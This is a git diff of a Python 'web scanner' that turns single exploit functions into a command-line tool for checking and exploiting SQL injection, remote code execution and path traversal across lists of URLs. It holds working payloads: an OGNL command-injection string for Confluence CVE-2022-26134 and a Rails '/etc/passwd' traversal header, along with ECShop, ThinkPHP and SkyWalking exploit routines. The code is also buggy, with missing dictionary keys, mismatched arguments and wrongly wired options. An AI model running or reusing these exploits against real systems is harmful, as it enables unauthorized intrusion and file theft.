@@ -1,8 +1,11 @@
+from ctypes import sizeof
+from math import fabs
+from sqlite3 import SQLITE_ATTACH
 from typing import Type
 from wsgiref import headers
 import requests
 
-def exploit_confluence_CVE_2022_26134():
+def exploit_confluence_CVE_2022_26134(URL):
     url1 = input('write url\n')
     url1 += "{(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(" + "id"").getInputStream()," + "utf-8"")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader(" + "X-Cmd-Response"",#a))}/"
     headers1 = { "HOST":"192.168.56.101:8090", 
@@ -14,7 +17,7 @@ def exploit_confluence_CVE_2022_26134():
     res1 = requests.get(url1, headers1)
     print(res1.headers)
 
-def check_confluence_CVE_2022_26134():
+def check_confluence_CVE_2022_26134(URL):
     url1 = input('write url\n')
     res1 = requests.post(url1)
     if(res1.headers['x-confluence-request-time'] != 0):
@@ -23,7 +26,7 @@ def check_confluence_CVE_2022_26134():
     else:
         print('lol')
 
-def exploit_ecshop():
+def exploit_ecshop(URL):
     url1 = input('write url\n') + "/user.php?act=login"
     headers1 = {"Host":"192.168.56.101",
                 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
@@ -42,7 +45,7 @@ def exploit_ecshop():
     else:
         print("something went wrong")
 
-def check_ecshop():
+def check_ecshop(URL):
     url1 = input('write url\n') + "/user.php?act=login"
     headers1 = {"Host":"192.168.56.101",
                 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
@@ -59,7 +62,7 @@ def check_ecshop():
     if (my_str == "ECS"):
         print("SQLi can be used")
 
-def thinkphp_exploit_RCE():
+def thinkphp_exploit_RCE(URL):
     url1 = input('write url\n') 
     url1 += "/index.php?s=captcha"
     my_heads = {"Host":"localhost",
@@ -79,8 +82,8 @@ def thinkphp_exploit_RCE():
 
     
 
-def chech_thinkphp():
-    url1 = input('write url\n')
+def chech_thinkphp(URL):
+    url1 = URL
     req = requests.get(url1)
     my_str = ""
     i = req.text.find('[') + 3
@@ -90,8 +93,8 @@ def chech_thinkphp():
         print("RCE vulnerability found")
 
    
-def exploit_Rails():
-    url1 = input('write url\n') + "/robots"
+def exploit_Rails(URL):
+    url1 = URL + "/robots"
     headers1 = {"Host":"192.168..56.101:3000",
                 "Accept-Encoding":"gzip, deflate",
                 "Accept":"../../../../../../../../etc/passwd{{",
@@ -101,8 +104,8 @@ def exploit_Rails():
     req = requests.get(url1, headers1)
     print(req.text)
 
-def exploit_SKYWALKING():
-    url1 = input('write url\n') + "/graphql"
+def exploit_SKYWALKING(URL):
+    url1 = URL + "/graphql"
     headers1 = {"Host":"localhost:8080",
                 "Accept-Encoding": "gzip, deflate",
                 "Accept": "*/*",
@@ -115,22 +118,130 @@ def exploit_SKYWALKING():
     req = requests.post(url1, headers1, my_params)
     print(req.text)
 
-def check_SKYWALKING():
-    url1 = input('write url\n')
+def check_SKYWALKING(URL):
+    url1 = URL
     res1 = requests.get (url1)
     print(res1.headers)
 
 def main():
-    chech_thinkphp()
-    thinkphp_exploit_RCE()
-    exploit_ecshop()
-    check_ecshop()
-    check_confluence_CVE_2022_26134()
-    exploit_confluence_CVE_2022_26134()
-    exploit_SKYWALKING()
-    exploit_SKYWALKING()
-    check_SKYWALKING()
+    print("This is WEB scanner\nYou can write -h or --help to see what scanner can do")
+    my_info = "-h  or --HELP  prints info\n\n"+"-sc or --SQLc  checks for SQLi\n\n"+"-se or --SQLe  exploits SQLi\n\n"+"-rc or --RCEc  chechs RCE\n\n"+"-re or --RCEe  exploits RCE\n\n"+"-f  or --FILE  gets URL from file\n\n"+"-u  or --URL   gets URL  straight\n\n"+"-t  or --PT    exploits Path Traversal\n\n"+"-o  or --OF    write output in file\n\n"+"-i  or --IF    to get URLs from file\n\n"+"-k  or --KILL  stops programm"
+
+
+    flag = True;
+    while(flag):
+        my_task = input()
+        my_flags = {'sc':0,
+                    'se':0,
+                    'rc':0,
+                    're':0,
+                    'f':0,
+                    'i':0,
+                    't':0,
+                    'o':0}
+        if my_task == "--HELP" or my_task == "-h":
+            print(my_info)
+        if my_task == "-KILL" or my_task == "-k":
+            break
+        my_mas = my_task.split(" ")
+        for b in range (len(my_mas)):
+            if my_mas[b][0] == '-':
+                print(my_mas[b][1:])
+                if my_mas[b][1:] == 'u' or my_mas[b][1:] == '-URL':
+                    my_flags['u'] = b
+                elif my_mas[b][1:] == 'sc' or my_mas[b][1:] == '-SQLc':
+                        my_flags['sc'] = b
+                elif my_mas[b][1:] == 'se' or my_mas[b][1:] == '-SQLe':
+                    my_flags['se'] = b
+                elif my_mas[b][1:] == 'rc' or my_mas[b][1:] == '-RCEc':
+                    my_flags['rc'] = b
+                elif my_mas[b][1:] == 're' or my_mas[b][1:] == '-RCEe':
+                    my_flags['re'] = b
+                elif my_mas[b][1:] == 'f' or my_mas[b][1:] == '-FILE':
+                    my_flags['f'] = b
+                elif my_mas[b][1:] == 'o' or my_mas[b][1:] == '-OF':
+                    my_flags['o'] = b
+                elif my_mas[b][1:] == 'i' or my_mas[b][1:] == '-IF':
+                    my_flags['i'] = b
+                elif my_mas[b][1:] == 't' or my_mas[b][1:] == '-PT':
+                    my_flags['t'] = b
+
+        print(my_flags)
+
+
+
+
+
+
+        if [my_flags['o']]:
+            f_w = open(my_mas[my_flags['o'] - 1])
+        if my_flags['i']:
+            f_r = open(my_mas[my_flags['i'] - 1])
+        if my_flags['u']:
+            URL = my_mas[my_flags['u'] - 1]
+        elif my_flags['sc']:
+            if my_flags['i']:
+                for URL in f_r:
+                    if [my_flags["o"]]:
+                        f_w.write(check_ecshop(URL))
+                    else:
+                        check_ecshop(URL)
+            else:
+                if [my_flags["o"]]:
+                        f_w.write(check_ecshop(URL))
+                else:
+                        check_ecshop(URL)
+        elif my_flags['se']:
+            if my_flags['i']:
+                for URL in f_r:
+                    if [my_flags["o"]]:
+                        f_w.write(exploit_SKYWALKING(URL))
+                    else:
+                        exploit_SKYWALKING(URL)
+            else:
+                if [my_flags["o"]]:
+                    f_w.write(exploit_SKYWALKING(URL))
+                else:
+                    exploit_SKYWALKING(URL)
+        elif my_flags['rc']:
+            if my_flags['i']:
+                for URL in f_r:
+                    if [my_flags["o"]]:
+                        f_w.write(chech_thinkphp(URL))
+                    else:
+                        chech_thinkphp(URL)
+            else:
+                if [my_flags["o"]]:
+                        f_w.write(chech_thinkphp(URL))
+                else:
+                    chech_thinkphp(URL)
+        elif my_flags['re']:
+            if my_flags['i']:
+                for URL in f_r:
+                    if my_flags['o']:
+                        f_w.write(exploit_confluence_CVE_2022_26134())
+                    else:
+                        exploit_confluence_CVE_2022_26134()
+            else:
+                if my_flags['o']:
+                    f_w.write(exploit_confluence_CVE_2022_26134())
+                else:
+                    exploit_confluence_CVE_2022_26134()
+
+        elif my_flags['t']:
+            if my_flags['i']:
+                for URL in f_r:
+                    if my_flags['o']:
+                        f_w.write(exploit_Rails())
+                    else:
+                        print(exploit_Rails())
+            else:
+                if my_flags['o']:
+                     f_w.write(exploit_Rails(URL))
+                else:
+                    exploit_Rails(URL)
+
 
 if __name__ == "__main__":
-    main()    
+    main() 
 
